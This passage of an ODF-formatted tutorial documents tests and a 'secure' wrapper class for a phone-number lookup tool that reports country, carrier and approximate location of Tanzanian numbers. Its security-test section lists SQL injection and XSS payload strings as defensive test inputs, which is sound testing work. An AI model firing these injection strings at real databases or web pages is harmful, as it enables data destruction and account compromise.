      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test tracking a valid Tanzanian fixed line number."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Dar es Salaam area code 22</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track("+255221234567")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertTrue(result.valid)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(result.country_code, 255)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(result.country_name, "Tanzania")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIsNone(result.carrier_name) <text:s/># Fixed lines have no carrier</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIn("Dar es Salaam", result.location)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_invalid_number_format(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test handling of invalid number format."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track("0712345678") <text:s/># Missing country code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertFalse(result.valid)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_nonexistent_number(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test handling of valid format but invalid number."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Valid format but not a real number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track("+255999999999")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertFalse(result.valid)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>@patch('src.core.geocoder.get_coordinates_from_location')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_coordinate_fallback(self, mock_geocoder):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test fallback to hardcoded coordinates when online fails."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>mock_geocoder.return_value = None <text:s/># Simulate online failure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Should still have coordinates from fallback database</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIsNotNone(result.latitude)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIsNotNone(result.longitude)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_number_type_detection(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test detection of number types."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>mobile = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(mobile.number_type, "Mobile")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Toll-free number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>tollfree = self.tracker.track("+255800123456")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(tollfree.number_type, "Toll Free")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">if __name__ == '__main__':</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>unittest.main()</text:p>
      <text:p text:style-name="Preformatted_20_Text">9.2 Integration Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: tests/test_integration.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">import unittest</text:p>
      <text:p text:style-name="Preformatted_20_Text">import requests</text:p>
      <text:p text:style-name="Preformatted_20_Text">import json</text:p>
      <text:p text:style-name="Preformatted_20_Text">import time</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class TestAPIEndpoints(unittest.TestCase):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Integration tests for API endpoints."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>BASE_URL = "http://localhost:5000/api/v1"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def setUp(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Wait for server to be ready."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>time.sleep(2)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_track_endpoint(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test the main tracking endpoint."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>json={"phone_number": "+255712345678"}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>data = response.json()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertTrue(data['valid'])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(data['country_code'], 255)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(data['country_name'], "Tanzania")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_bulk_endpoint(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test bulk tracking endpoint."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>numbers = ["+255712345678", "+255752345678", "+255652345678"]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>f"{self.BASE_URL}/bulk",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>json={"numbers": numbers}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>data = response.json()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(len(data['results']), 3)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_rate_limiting(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test rate limiting functionality."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/># Make many requests quickly</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for i in range(10):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>response = requests.post(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>json={"phone_number": f"+25571234567{i}"}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if i &lt; 5: <text:s/># First 5 should succeed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>else: <text:s/># After limit, should be rate limited</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.assertEqual(response.status_code, 429)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_invalid_input(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test handling of invalid input."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>json={"phone_number": "invalid"}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(response.status_code, 400)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIn("error", response.json())</text:p>
      <text:p text:style-name="Preformatted_20_Text">9.3 Performance Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text">import time</text:p>
      <text:p text:style-name="Preformatted_20_Text">import statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">from concurrent.futures import ThreadPoolExecutor, as_completed</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def performance_test():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Measure response times under load."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>test_numbers = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255712345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255752345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255652345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255742345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255762345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255222345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255242345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"+255262345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>] * 100 <text:s/># 800 total requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track_with_metrics(number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>start = time.time()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = tracker.track(number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>duration = time.time() - start</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return duration, result.valid</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Run concurrent requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>latencies = []</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>successes = 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>with ThreadPoolExecutor(max_workers=20) as executor:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>futures = [executor.submit(track_with_metrics, num) for num in test_numbers]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for future in as_completed(futures):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>latency, valid = future.result()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>latencies.append(latency)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="16"/>successes += 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Calculate metrics</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Total requests: {len(test_numbers)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Success rate: {successes/len(test_numbers)*100:.1f}%")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Average latency: {statistics.mean(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Median latency: {statistics.median(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"95th percentile: {sorted(latencies)[int(len(latencies)*0.95)]*1000:.2f} ms")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Max latency: {max(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="Preformatted_20_Text">9.4 Security Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text">def security_test():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Test for common security vulnerabilities."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Test 1: SQL Injection (if using database)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>malicious_inputs = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"' OR '1'='1",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"'; DROP TABLE users; --",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"' UNION SELECT * FROM passwords--",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for malicious in malicious_inputs:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = tracker.track(f"+255{malicious}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Should handle gracefully, not crash</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"SQL injection test '{malicious[:20]}...': {'PASS' if not result.valid else 'FAIL'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Test 2: XSS attempts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>xss_inputs = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"&lt;script&gt;alert('XSS')&lt;/script&gt;",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"&lt;img src=x onerror=alert(1)&gt;",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"javascript:alert('XSS')",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for xss in xss_inputs:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = tracker.track(f"+255{xss}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Should not execute in logs or output</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"XSS test '{xss[:20]}...': PASS")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Test 3: Rate limiting bypass attempts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print("\nTesting rate limiting...")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Implementation would check if rate limiter can be bypassed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Test 4: Information disclosure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print("\nChecking for information disclosure in error messages...")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Errors should not reveal internal details</text:p>
      <text:p text:style-name="Preformatted_20_Text">10. Final Working Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here's a complete, production-ready example that combines everything we've discussed:</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: complete_example.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">#!/usr/bin/env python3</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Complete working example of J Phone NoTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">Demonstrates all features with proper error handling, logging, and security.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import os</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>import sys</text:p>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">import json</text:p>
      <text:p text:style-name="Preformatted_20_Text">from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text">from typing import Optional, Dict, Any</text:p>
      <text:p text:style-name="Preformatted_20_Text">import argparse</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Add project root to path</text:p>
      <text:p text:style-name="Preformatted_20_Text">sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Core imports</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import PhoneNumberTracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.validators import sanitize_phone_number, validate_phone_number</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.logger import setup_logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Security imports</text:p>
      <text:p text:style-name="Preformatted_20_Text">import hashlib</text:p>
      <text:p text:style-name="Preformatted_20_Text">import hmac</text:p>
      <text:p text:style-name="Preformatted_20_Text">from functools import wraps</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class SecurePhoneTracker:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Production-ready phone tracker with security features.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, api_key: Optional[str] = None, offline_mode: bool = False):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Initialize secure tracker.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>api_key: API key for authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>offline_mode: If True, use only offline databases</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.api_key = api_key</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.offline_mode = offline_mode</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Initialize tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.tracker = PhoneNumberTracker(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>use_online_geocoding=not offline_mode,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>cache_results=True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Setup logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger = setup_logging(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>log_dir="logs",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>log_file="secure_tracker.log",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>level=logging.INFO</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Rate limiting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>from collections import defaultdict</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>import time</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.request_log = defaultdict(list)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.rate_limit = 100 <text:s/># requests per hour</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.rate_window = 3600 <text:s/># 1 hour in seconds</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger.info("SecurePhoneTracker initialized <text:soft-page-break/>(offline_mode={})".format(offline_mode))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def authenticate(self, provided_key: str) -&gt; bool:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Authenticate API key using constant-time comparison.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>provided_key: API key to check</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>True if authenticated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not self.api_key:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return True <text:s/># No authentication required</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Constant-time comparison to prevent timing attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return hmac.compare_digest(provided_key, self.api_key)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def check_rate_limit(self, client_id: str) -&gt; bool:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Check if client is within rate limits.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>client_id: Client identifier (IP address or user ID)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>True if request allowed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>now = datetime.now().timestamp()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>window_start = now - self.rate_window</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Clean old requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.request_log[client_id] = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>t for t in self.request_log[client_id]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if t &gt; window_start</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Check limit</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if len(self.request_log[client_id]) &gt;= self.rate_limit:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.logger.warning(f"Rate limit exceeded for {client_id}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return False</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Log this request</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.request_log[client_id].append(now)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track_phone(self, phone_number: str, client_id: str = "unknown") -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Track a phone number with full security and logging.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
